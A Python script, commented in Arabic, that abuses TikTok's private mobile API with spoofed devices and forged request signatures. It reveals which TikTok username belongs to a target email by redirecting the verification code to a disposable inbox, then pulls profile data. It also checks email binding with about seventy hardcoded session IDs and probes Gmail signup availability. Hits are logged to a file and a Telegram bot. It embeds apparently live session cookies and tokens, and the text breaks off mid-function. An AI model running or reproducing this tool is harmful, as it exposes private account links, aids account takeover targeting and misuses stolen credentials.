import asyncio
import aiohttp
import os
import urllib.parse
import random
import secrets
import time
import requests
import json
import re
import binascii
import uuid
from concurrent.futures import ThreadPoolExecutor
from SignerPy import sign as signerpy_sign
from bs4 import BeautifulSoup
import SignerPy  # للدالة الثالثة

# =================================================================
# إعدادات البوت (تُطلب من المستخدم)
# =================================================================
BOT_TOKEN = ""
CHAT_ID = ""

# =================================================================
# دوال مساعدة من email2user
# =================================================================
def xor_enc(string):
    return "".join([hex(ord(c) ^ 5)[2:] for c in string])

def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.ok
    except:
        return False

def extract_username_from_email(target_email, silent=False):
    """
    استخراج اسم المستخدم من البريد الإلكتروني عبر تيك توك.
    تعيد (username, fake_email) أو (None, None) في حال الفشل.
    """
    if not silent:
        print("🔄 جاري تحضير بريد مؤقت...")
    session = requests.Session()
    try:
        res_get_addr = session.get("https://www.guerrillamail.com/ajax.php?f=get_email_address", timeout=10)
        mail_data = res_get_addr.json()
        fake_email = mail_data['email_addr']
        if not silent:
            print(f"📧 البريد المؤقت جاهز: {fake_email}")
    except Exception as e:
        if not silent:
            print(f"❌ فشل الحصول على بريد مؤقت: {e}")
        return None, None

    if not silent:
        print("🔄 جاري استخراج تيكت الحساب...")
    params = {
        "request_tag_from": "h5",
        "fixed_mix_mode": "1",
        "mix_mode": "1",
        "account_param": xor_enc(target_email),
        "scene": "1",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "type": "3736",
        "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        "cdid": str(uuid.uuid4()),
        "channel": "googleplay",
        "aid": "1233",
        "app_name": "musical_ly",
        "version_code": "370805",
        "version_name": "37.8.5",
        "manifest_version_code": "2023708050",
        "update_version_code": "2023708050",
        "ab_version": "37.8.5",
        "resolution": "1600*900",
        "dpi": "240",
        "device_type": "SM-G998B",
        "device_brand": "samsung",
        "language": "en",
        "os_api": "28",
        "os_version": "9",
        "ac": "wifi",
        "is_pad": "0",
        "current_region": "TW",
        "app_type": "normal",
        "sys_region": "US",
        "last_install_time": "1754073240",
        "mcc_mnc": "46692",
        "timezone_name": "Asia/Baghdad",
        "carrier_region_v2": "466",
        "residence": "TW",
        "app_language": "en",
        "carrier_region": "TW",
        "timezone_offset": "10800",
        "host_abi": "arm64-v8a",
        "locale": "en-GB",
        "ac2": "wifi",
        "uoo": "1",
        "op_region": "TW",
        "build_number": "37.8.5",
        "region": "GB",
        "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        "iid": str(random.randint(1, 10**19)),
        "device_id": str(random.randint(1, 10**19)),
        "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
        "support_webview": "1",
        "okhttp_version": "4.2.210.6-tiktok",
        "use_store_region_cookie": "1",
        "app_version": "37.8.5"
    }

    passport_ticket = None
    attempts = 0
    while not passport_ticket and attempts < 10:
        attempts += 1
        try:
            H = signerpy_sign(params=params, cookie={})
            headers = {
                'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
                'x-ss-stub': H.get('x-ss-stub', ''),
                'x-tt-dm-status': "login=1;ct=1;rt=1",
                'x-ss-req-ticket': H.get('x-ss-req-ticket', ''),
                'x-ladon': H.get('x-ladon', ''),
                'x-khronos': H.get('x-khronos', ''),
                'x-argus': H.get('x-argus', ''),
                'x-gorgon': H.get('x-gorgon', ''),
                'content-type': "application/x-www-form-urlencoded",
            }
            url_lookup = "https://api16-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
            response = requests.post(url_lookup, headers=headers, params=params, timeout=10)
            data = response.json()
            if "data" in data and "accounts" in data["data"] and len(data["data"]["accounts"]) > 0:
                passport_ticket = data["data"]["accounts"][0]["passport_ticket"]
                break
        except Exception as e:
            time.sleep(2)

    if not passport_ticket:
        if not silent:
            print("❌ فشل استخراج التيكت. قد لا يكون البريد مرتبطاً بحساب تيك توك.")
        return None, fake_email

    if not silent:
        print("✅ تم استخراج التيكت بنجاح.")
        print(f"🔄 جاري إرسال رمز التحقق إلى {fake_email}...")

    url_send = "https://api16-normal-c-alisg.tiktokv.com/passport/email/send_code/"
    params.update({"not_login_ticket": passport_ticket, "email": xor_enc(fake_email)})
    
    sent = False
    attempts = 0
    raw_res = ""
    while not sent and attempts < 10:
        attempts += 1
        try:
            H_s = signerpy_sign(params=params, cookie={})
            headers_s = {
                'User-Agent': headers['User-Agent'],
                'x-ss-stub': H_s.get('x-ss-stub', ''),
                'x-ss-req-ticket': H_s.get('x-ss-req-ticket', ''),
                'x-ladon': H_s.get('x-ladon', ''),
                'x-khronos': H_s.get('x-khronos', ''),
                'x-argus': H_s.get('x-argus', ''),
                'x-gorgon': H_s.get('x-gorgon', ''),
                'content-type': "application/x-www-form-urlencoded",
            }
            res_send = requests.post(url_send, headers=headers_s, params=params, timeout=10)
            raw_res = res_send.text
            if "success" in res_send.text:
                sent = True
                break
            else:
                time.sleep(2)
        except Exception as e:
            time.sleep(2)

    if not sent:
        if not silent:
            print(f"❌ فشل إرسال رمز التحقق للبريد المؤقت.\nالرد: {raw_res[:200]}")
        return None, fake_email

    if not silent:
        print("✅ تم إرسال الرمز بنجاح. جاري فحص صندوق الوارد (قد يستغرق دقيقة)...")

    found_username = None
    start_time = time.time()
    while time.time() - start_time < 180:
        time.sleep(5)
        try:
            res_check = session.get(f"https://www.guerrillamail.com/ajax.php?f=check_email&seq=0&_={int(time.time())}", timeout=10)
            emails = res_check.json().get('list', [])
            
            if emails:
                for mail in emails:
                    if "TikTok" in mail.get('mail_from', '') or "6-digit" in mail.get('mail_subject', ''):
                        mail_id = mail.get('mail_id')
                        res_fetch = session.get(f"https://www.guerrillamail.com/ajax.php?f=fetch_email&email_id={mail_id}", timeout=10)
                        body = res_fetch.json().get('mail_body', '')
                        soup = BeautifulSoup(body, "html.parser")
                        text_content = soup.get_text()
                        
                        patterns = [
                            r'verify that @([\w\.]+)',
                            r'Hi ([\w\.]+),',
                            r'generated for\s+([\w\.]+)'
                        ]
                        
                        for p in patterns:
                            match = re.search(p, text_content)
                            if match:
                                found_username = match.group(1)
                                break
                    if found_username:
                        break
            if found_username:
                break
        except Exception as e:
            pass

    if found_username:
        if not silent:
            print(f"\n✅ تمت العملية بنجاح!")
            print(f"📧 البريد: {target_email}")
            print(f"👤 اليوزرنيم: @{found_username}")
            print(f"📧 البريد المؤقت المستخدم: {fake_email}")
        return found_username, fake_email
    else:
        if not silent:
            print("⏰ انتهت مهلة الانتظار دون تلقي الرمز. يرجى المحاولة لاحقاً.")
        return None, fake_email

# =================================================================
# دوال جلب معلومات الحساب من TikTok (السورس الثالث)
# =================================================================
SESSION_ID = "be05cf2818247f569cac130fddb65c9f"

def generate_device_id():
    return str(random.randint(7000000000000000000, 7999999999999999999))

def generate_openudid():
    return ''.join(random.choices('0123456789abcdef', k=16))

def generate_install_id():
    return str(random.randint(7000000000000000000, 7999999999999999999))

def get_tiktok_data_stable(username):
    username = username.replace("@", "").strip()
    url = f"https://www.tiktok.com/api/user/detail/?uniqueId={username}&language=en"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Referer": f"https://www.tiktok.com/@{username}",
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200 and "userInfo" in response.text:
            data = response.json()
            uid = data.get("userInfo", {}).get("user", {}).get("id")
            if uid:
                return uid
    except:
        pass

    try:
        mobile_url = f"https://www.tiktok.com/@{username}"
        res = requests.get(mobile_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, timeout=10)
        user_id = re.search(r'"userId":"(\d+)"', res.text) or re.search(r'"id":"(\d+)"', res.text)
        if user_id:
            return user_id.group(1)
    except:
        pass

    return None

def get_tiktok_user_info(username, silent=False):
    """تعيد dict يحتوي على معلومات الحساب، أو None في حال الفشل"""
    username = username.replace("@", "").strip()
    target_uid = get_tiktok_data_stable(username)
    if not target_uid:
        if not silent:
            print("لم يتم العثور على User ID")
        return None

    device_id = generate_device_id()
    openudid = generate_openudid()
    install_id = generate_install_id()

    cookies = {
        'install_id': install_id,
        'sid_guard': f"{SESSION_ID}|1779386695|15552000|Tue, 17-Nov-2026 18:04:55 GMT",
        'sid_tt': SESSION_ID,
        'sessionid': SESSION_ID,
        'sessionid_ss': SESSION_ID,
        'uid_tt': 'cb1db6b1c8c2d74cb6952ba78612663f27be913508b42b5384d03cd9de7ab961',
        'uid_tt_ss': 'cb1db6b1c8c2d74cb6952ba78612663f27be913508b42b5384d03cd9de7ab961',
    }

    params = {
        "user_role": f'{{"7592708666609648656":1,"{target_uid}":1}}',
        "request_from": "profile_card_v2",
        "request_from_scene": "1",
        "need_preload_room": "false",
        "target_uid": target_uid,
        "anchor_id": "6944055971363095557",
        "packed_level": "2",
        "need_block_status": "true",
        "current_room_id": "7642399341407980308",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "channel": "googleplay",
        "aid": "1233",
        "app_name": "musical_ly",
        "version_code": "370805",
        "version_name": "37.8.5",
        "manifest_version_code": "2023708050",
        "update_version_code": "2023708050",
        "device_type": "NE2211",
        "device_brand": "OnePlus",
        "language": "ar",
        "os_api": "28",
        "os_version": "9",
        "ac": "wifi",
        "app_type": "normal",
        "sys_region": "EG",
        "app_language": "ar",
        "host_abi": "arm64-v8a",
        "locale": "ar",
        "region": "EG",
        "iid": install_id,
        "device_id": device_id,
        "openudid": openudid,
        "webcast_sdk_version": "3690",
        "webcast_language": "ar",
        "webcast_locale": "ar_EG",
        "es_version": "3",
        "effect_sdk_version": "18.0.0",
    }

    H = SignerPy.sign(params=params, cookie=cookies)

    headers = {
        'host': 'webcast31-normal-alisg.tiktokv.com',
        'user-agent': 'com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; ar; NE2211; Build/SKQ1.220617.001;tt-ok/3.12.13.16)',
        'accept-encoding': 'gzip',
        'x-tt-pba-enable': '1',
        'x-bd-kmsv': '0',
        'x-tt-dm-status': 'login=1;ct=1;rt=1',
        'x-ss-req-ticket': H.get('x-ss-req-ticket'),
        'x-bd-client-key': '#SkM1DMS39XHjnJIti+mXCKKWKdMZMWfciutP4uQWAfYKpvKvBSS5fgHKh6EeOAqxRFKFh4855ZOFmHV5',
        'live-trace-tag': 'profileDialog_batchRequest',
        'sdk-version': '2',
        'x-tt-token': '034c00e759d3ebd0e309fdd0ed26850a6e031d3b05e7c46c73a50808cd7b2dd9bb64b067338ccea9e81d7e4980694c6989419d50a24bf9040ec093752be121f1a9fe07ca6f3148f9bee967ea65a2a1df6b81c98a734bfd5582f6e67c74a788069fab9--0a4e0a20df361525fd8a6617c1c2578f46aaf5df67af1bafd8cf3d16eac5df70d12a0d951220b96264c0177f7ef0bc2c0b1c7b9db95db490d673c861a3cc20fce706172743b01801220674696b746f6b-3.0.1',
        'passport-sdk-version': '6031990',
        'x-ladon': H.get('x-ladon'),
        'x-khronos': H.get('x-khronos'),
        'x-argus': H.get('x-argus'),
        'x-gorgon': H.get('x-gorgon'),
    }

    url = "https://webcast31-normal-alisg.tiktokv.com/webcast/user/"

    try:
        response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=15)
        if response.status_code != 200:
            if not silent:
                print(f"خطأ: Status Code {response.status_code}")
            return None

        user = response.json().get("data", {})
        if not user:
            return None

        # استخراج المستوى
        level = 0
        for badge in user.get("badge_list", []):
            privilege = badge.get("privilege_log_extra", {})
            lvl = privilege.get("level")
            if lvl and str(lvl) != "0":
                level = int(lvl)
                break
            str_val = badge.get("combine", {}).get("str")
            if str_val and str_val.isdigit() and str_val != "0":
                level = int(str_val)
                break

        # استخراج البيانات المطلوبة
        result = {
            "username": user.get("display_id", ""),
            "user_id": user.get("id", ""),
            "sec_uid": user.get("sec_uid", ""),
            "nickname": user.get("nickname", "غير متوفر"),
            "bio": user.get("bio_description", "لا يوجد"),
            "followers": user.get("follow_info", {}).get("follower_count", 0),
            "following": user.get("follow_info", {}).get("following_count", 0),
            "likes": user.get("author_stats", {}).get("video_total_favorite_count", 0),
            "level": level,
            "subscribers": user.get("subscribe_info", {}).get("subscriber_count", 0) if user.get("subscribe_info", {}).get("enable_subscription") else 0
        }
        return result

    except Exception as e:
        if not silent:
            print(f"خطأ في get_tiktok_user_info: {e}")
        return None

# =================================================================
# الكود الأصلي لـ test.py (معدل)
# =================================================================

SESSIONS = [
    "fb7ae05cf93cc68953c2cbbc0a741a46",
    "14a354bbb19b762b841b20a17f608904",
    "e1bbb219de37ce313016bbd0906d101c",
    "6ae5e5d56def1bee209899b4d5b57d99",
    "0c27cd55cb95e27cd7a6a93472283f75",
    "712aba2b74cbda78e26d462392daa0bc",
    "7a15b48025dd72ae1d639367edc12f08",
    "ade3845839c25fd15efb876389a9b79d",
    "e738de5da7d8848387859d805f6113bb",
    "03d9a44e58a4722d6ff5f0d412a34bcd",
    "f64bccdfe093b5f0092c571d87e7f8f2",
    "1bed98281ec439b1c367e7ff850d7fae",
    "d8d2e956df6e87accbae359d1e439f2f",
    "056b2ba42cdb8773a1063d9d7ff9b26e",
    "4626c1650d3ebfd717303caa1bde46dc",
    "d137f7e0597cef9025d0cce241b78599",
    "96e62576557d9ecd682336d49f6a173f",
    "3464a0661c2291ef43fb46df36bdb655",
    "46bf39534e61a1f9ab65997592e9991b",
    "81b1d8d98d6c8c7d1ec0dd1ac4fef9f6",
    "2ed5e12e28e0de3be3d6ddc6d054ee10",
    "76f4b59d80e6102bf1f28a44a4114744",
    "f61e23b2dbe6126b188a219597d58665",
    "f748c0fc169f672d78d2bd67ff2e9770",
    "1a32c8c07c42522f6028d24322bb58ce",
    "313465a9bd3135ab864052a84894117c",
    "88ef553710a310d5717a8d07432cb29b",
    "d4efcb3a8279c5f86403f87528cbce0b",
    "fe04f4157ee5d5c63ffe050fcdf847be",
    "3dfe52a70333bc5a1ebe30ad87a91326",
    "699d554a0ce0fc55ffb1dc2fa6a66d18",
    "4054d2167a9197572d616322b886629f",
    "14c15133c67f1914c9d48cd13ceb32ba",
    "cc0cd3d92337375709b563780f2e884c",
    "ee083dfb528df28a22fbc82136707c36",
    "97924c7a6449b59101625f34ccbc4477",
    "0b674f063c9b5eb215b24a04b39d838f",
    "bf8c7976c2c584cbb5fe458a137ca3b6",
    "a8497c444e0bddadbd18e32fbcd88c6b",
    "5ed1ac085d255f1dadca21d89ac4877c",
    "f31da58304fedeae1a1b0d67cfa7bef0",
    "92cc88094f3be13a881af326d3d36ea3",
    "650174dfd8d21329133d3372fe4f093d",
    "5d10557d1b7f886f5a91f3cd699cec4f",
    "caa2a1856326d6304f30014735fc8201",
    "a889d40f8dcbe081c03b57cb239c4101",
    "b62629c64b091b27696330882ea1a398",
    "56f54b0e3275ea174f5663140e250720",
    "9c6ae513d129f6b0767750313e6dc98e",
    "fbf72932d05ad2d5bd9c9d75f1cc349a",
    "237eab46df0eeea4ec44015bae8e01b1",
    "1746b765f90029accb8f7e1bda3cdde2",
    "1bb1decc0e2c0847114f502f53bbd098",
    "4e7f1b299e08e894ab8d03e6c7257e36",
    "5b839c588f1838a09b876242a3750b71",
    "b9249e23bdff2c3ea427310f011ad645",
    "c8c8b010884773c98783d9e72b286e05",
    "7fcc9e747e7398aa6d7f785dea4fe43b",
    "6f9976a37b9a2ac42cc08d7b2f825493",
    "660c239140570204ff584d59378a17c4",
    "0e299efc7f229c5025a106728cb9c28d",
    "705e9bdded81fa896c4c3dba1dc38c37",
    "4cf563d7edd2b34bbb19ff0aa26e2ad0",
    "0a64560b3f5769739b6e2d65e7f4f82d",
    "f2dea3fad34b3159c5a4c5a3b144f88e",
    "33ec88054c919e09d60d63805e8ea6ba",
    "6e3164a9fdb32af31178fbe157fafa26",
    "03be325bb6c96f06d851b2784aad28c4"
]

INPUT_FILE = "ali.txt"           
OUTPUT_GOOD = "hit.txt"          
THREADS = 1                   

total_checked = 0
good_count = 0
bad_count = 0
not_found_count = 0
error_count = 0

followers_stats = {
    "0-1k": 0,
    "1k-10k": 0,
    "10k-100k": 0,
    "100k-1M": 0
}

lock = asyncio.Lock()
queue = asyncio.Queue()
results = []  

def check_tiktok(email):
    session_id = random.choice(SESSIONS)
    secret = secrets.token_hex(16)
    cookies = {
        "passport_csrf_token": secret,
        "passport_csrf_token_default": secret,
        "sessionid": session_id
    }
    url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
    params = {
        "request_tag_from": "h5",
        "fixed_mix_mode": "1",
        "mix_mode": "1",
        "passport-sdk-version": "0",
        "app_language": "en",
        "scene": "4",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "channel": "googleplay",
        "aid": "1233",
        "app_name": "musical_ly",
        "version_code": "360505",
        "version_name": "36.5.5",
        "manifest_version_code": "2023605050",
        "update_version_code": "2023605050",
        "ab_version": "36.5.5",
        "resolution": "1440*2969",
        "dpi": "532",
        "language": "EN",
        "os_api": "34",
        "os_version": "14",
        "ac": "wifi",
        "is_pad": "0",
        "current_region": "US",
        "app_type": "normal",
        "sys_region": "US",
        "last_install_time": "1729289943",
        "mcc_mnc": "41820",
        "timezone_name": "Asia/Baghdad",
        "carrier_region_v2": "418",
        "residence": "US",
        "app_language": "en",
        "carrier_region": "US",
        "timezone_offset": "10800",
        "host_abi": "arm64-v8a",
        "locale": "ar",
        "ac2": "wifi",
        "uoo": "0",
        "op_region": "US",
        "build_number": "36.5.5",
        "region": "US",
        "support_webview": "1",
        "cronet_version": "1c651b66_2024-08-30",
        "ttnet_version": "4.2.195.8-tiktok",
        "use_store_region_cookie": "1",
        "device_id": str(random.randint(1, 10**19))
    }
    
    m = signerpy_sign(params=params, cookie=cookies)
    headers = {
        "sdk-version": "1",
        "user-agent": "com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)",
        "x-argus": m["x-argus"],
        "x-gorgon": m["x-gorgon"],
        "x-khronos": m["x-khronos"],
        "x-ladon": m["x-ladon"],
    }
    data = {"email": email}
    try:
        resp = requests.post(url, headers=headers, params=params, data=data, cookies=cookies, timeout=10)
        result = resp.json()
        error_code = result.get("data", {}).get("error_code")
        return error_code == 1023
    except Exception:
        return False

def check_gmail(username):
    try:
        s = requests.Session()
        url = "https://accounts.google.com/lifecycle/flows/signup"
        params = {
            'biz': "false",
            'continue': "https://accounts.google.com/",
            'ddm': "1",
            'flowEntry': "SignUp",
            'flowName': "GlifWebSignIn",
            'followup': "https://accounts.google.com/"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-full-version': '"124.0.6327.4"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-ch-ua-model': '"RMX3941"',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-wow64': "?0",
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'upgrade-insecure-requests': "1",
            'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
            'x-client-data': "CJCBywE=",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://accounts.google.com/",
            'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        response = s.get(url, params=params, headers=headers, timeout=10)
        tl = response.url.split('TL=')[1]
        at = response.text.split('"SNlM0e":"')[1].split('"')[0]
        s1 = response.text.split('"Qzxixc":"')[1].split('"')[0]
        
        headers_name = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params_name = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'hl': 'ar',
            'TL': tl,
            'rt': 'c',
        }
        temp_name = ''.join(random.choice('qwertyuiopasdfghjklzxcvbnm') for _ in range(7))
        data_name = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}'.format(temp_name, at)
        response = s.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params_name,
            headers=headers_name,
            data=data_name,
            timeout=10
        )
        
        bb = random.randrange(1980, 2006)
        bb2 = random.randrange(1, 13)
        bb3 = random.randrange(1, 29)
        
        headers_birth = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params_birth = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'hl': 'ar',
            'TL': tl,
            'rt': 'c',
        }
        data_birth = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CAs5qzpYCAAbeXqQI_l6N17gduh7_nJ70ADQBEArZ1EPK8oZNUN4scqBD1LJDlid5mrF15Vjfm1V3_GOCvJIqxq_SA7wT8wtmj_ABz-u7zQAACUWdAAAAJKcBB7EATeMJCM3Wyg_ToQSUbbAMsx2tXkvNW_NZsaAkzYYOD2wKQ9XReD8w2RmLaub6SH-yKdEV4HQAZSQjU483yUMGgOSTSa8aHsz0zz0LKzxVVgmFMLVZGTyy0KM9DgucFh5XtG72YQiS0lr_nbV4NvCH2IXEos3OLNYECjtaBR56OHi43_xMj55TAV86ez8Qv_c2Xx44rIHkPZPcswPATJKrTdoqbAeNg31HJgjGbOBD6T_qvcKlJgls6C0X4SDfcS_V-1QsPvJAY3UwhgyEzRCn6WjRySfa82JqX-tpiRGDQzHhpBqCciXVp3CfrUpFz6_uV5XwpzLAoVSXY9AVYNd9_8lHoDfwgaJyJ5rHNDIgilbr0tk5eJ4mDQXJBsBXriVKzwpREoGF-z2LxzcJNP5hHi1scWH8P89jSK9FQ1BK0XJY1fVd0bvtpXHvg-E2tD1bADqMB_o0U2eNSEnQ8QOwsJbV_6dmzt5lC-6ssNkal6834HUJ51HzFR-ngAczOdNdBRy1g9EJ4OSbkxmqVydF5WlLkVOMHs8WHY2L8TrBx2wl0a2whWnWhPpXx7oVpPELe4HM1ZdaB8FUZRUtZpaEuk7sCTSZ9F5Rmpkz2-PkK4hGmW4V647p6owz0v4a3OJkiXx4sVLwvAK2VAaoMaGYh0DEjGH5x22mz5ttqLfWB_pichHJB2MKnPMNjeDtu9vIa8LQzuiW9eX-wv8COzTFLqAMegIoiugQbp-kEtfh15s16ZImL8NGerWxHSAxMPq8DfPANrevCuRG3uIsMs6ruX7oqAx97OGl7n-os2qHZ9CODKYqfLTc77R3faVavUPF-VX9cZ2X61Jol5A92Xihx1Mf9XXIM0-Vj9v1jgdGaQlhfygIRfJkBVR-OQGaw0w5PTcPqZeP_m3PmoKEmwpwrEZFll7tYT5h88-SRpPi70kNM1sG33aenv1Ife4201F6s_z-g8wMXIGOF1PPawqcOaOSjw1Htz_hAsgMFK3a0-Yz8qDeQ5LniGceuOqZsofepJGRN0fi3IvEYJSPLCjjycd0jLnWPBQst2qOLC7DIT-vFzvkn3ByLiG4XjBk_YaQABGCRm4nf0ZNzWyUI9D6VnxpVBE37vzfr8O3IFOhcUZB3K-HfNUD5KQG-GnHWAb44Pol2-APWDWlynMvFM9hxOSCLn_3w_jqW9loJU5omB_65oEABYROQ6NpqvFEqP1DshnUYxvba_4EOpByLJSOCcYeS1CMZm7qxAFCWLbihK0gLM1LHArwIwdEZuzDQztm7Yn0fx4mqFcpeG4VZe1IMO2mlV3u_hZP5RLqk44N8dk6VuhZa2aoV5q8SWwi2F2taauJqFSCHHQ63MF1LmuXKwpMsG3VEb0-AezQH8kMdXtBE3a6TEf2QYPVVHSto5TAvZup0eK4XDqrxlQxRvWKpykuzeHQd-DRSO7pv82cCFbI6rdEQ_1zmbbYMB2CTPrRF26sDKp10EpRaVFCQV-iWwMFGyJ8X1pErD4d5Kmk2BNfSdge5O4LgLi-9DbezjLkjnKooGMSedkXtkhfQYg6dkmQ7o63v8w22KGgKK_-l0-9M1HohVyh52PlSnvJzB9-Zr-O7gQHfRn37H2aFjEzumasQ3CuMjHV0N7qVLitycNSU9hqK_Rqy3yHoIsAgH_Ag_IMs3Y5dA0GQGMN8MavlcB9NivGAd3hdi7aaHv-dBxvaeTq0rdkBV-Oq6zd0efYavJ1NPpCYWDI6C59M7y29HPKNLC6Gn0QVaXSNMYn8xHIgbtRBmPdSUJ41Fk_Rws3c1LE1HKxfGZWp1wbwxjDMxjDTRd1pJZzGnaEvENECrbnnMqQyQN3z4hhKUs2TrXPr7bat1Wags0HeeDRQvAUrnz60p5nQ9mn4XyziFRwSiMMLpW6hNCLkjqQuJLzOCURn8J4J3isI4Grc72VyBKX2pNgptvdwpuY20wDorj5tC4ObmfvVWP_UfZ1fC9samX1E4z204U7PFWYwq42TSFNLfQm6QkJu8RMJxkaK-CIViUjznXS35AL_Uph1gj_NEjgpKNHRuOfjMOvq4A9Z_bfsiNuSrwMmR-S6QoDD9K5qG0CSPqZ9Rdb4dBcP4MJI0drBkGPDWtRS0Nrc4m2w2d6dyX4V1KjhotwnXP-k6suLPrmGBLslU8o2TZ4GQUIPFCKV18NJjGBZcgsIL1EZe2jU2o2i15ujBOE5UWTf7QQOUf_cQPEXax_cWE_g27_DDTTA9yqKxFJ1VrKSrbJq-IhGLKjsFVJjjqZpjGhfjp4hS0AkIyAPlfHSsEZZ3w9un8oLUByBvqcGlTvsG9KqcJ6XtbRpjAWNgffHuplIyfKUKyvls4FLXXnWDA_3BcE5D01ebvWPV_uWhIr5YZxH0BP2Vnq85SuRBSWbMCiV7MF-25fkJAcMIfLbYP-Ljb6wkslQQ2P3g1NxLBsqGDOLcwy-CRx360bGwtxB2g5xMAxDtaFsMJuqgFfq8Ehap1XE44J4ca781_rKekY5sfFW8Rl-5f5rQqk2Z3YK4nEtAJW4M8WD-JTHv6KflBkLEaRdBGpn24xsUx3m4Cp6z8QZyKArBijacdgRDWrT9iuWwgmltnf1T8iuqHpAoORRX2MtQNXgGUpHFhmTZJ-VOvKP3lL70Hi0Wf7PwcdeUxNhak4Slg-rScIhISOx5l3IDvhwv6Ib4ps2QpHjgeGn6Zrkdd5_QwI46Xhgsk2hWyaABY_p71FlyvLMlusX6gxMNNUIO_XJrV1z6la_IU2tt6R4XaTaHDP270dCSrYrUPN1aNSQ6R9Q1JEuwryocAUur7CXeP_MJwUwLKI0ZGtQ3y1F-CPJGGeqnHVHtfKBxsoVDJ8tEon6DxNnhWUhrapkG9khflSIdEKDCe8-4j1OWvenAryE5rdLovfVBUInNZGeaSHf7EbT44mYpdod18b1i0ag4OPXipiBLwAM-5WgXw3ub4p1HcWHvQT5OZ9peZY7UIV7ut1Wqk2ypdRkfJKVdVZ5MEW0ela2yv8e0DfqfxxF1rsxjtAJ6oE3L5kR3dp_3jBJuzsW99TyupHHCavTvREsiH5RSHFynPKMtCSDnocPkzho2pFKPYtQqs4GV3rM-9o6tKqKPR_eXJUvLG5a6oVwXKyFiQQ0jMMJPZoNlb5v8rPfns-S21sMyVVQysr5ZWCh7qhSmD0OvVELaZ9SBMu5FsaR14ZbJ60vle149rKYQ5mX7ZFLNx84ROzkK1PFbw9RZQnfcavH6s1DyItsxIYpstKngqB8fKtlqJv0mJv0uG8M7woBeNZ7rokyWekhlcrnqOiNtkYr5VMPQ4fGfKiVXR_DgLGFWJweiYQfx-CrA2X8MFqt4ui3Ug%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Faccounts.google.com%2F%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}'.format(bb, bb2, bb3, at)
        response = s.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params_birth,
            headers=headers_birth,
            data=data_birth,
            timeout=10
        )
        
        headers_check = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
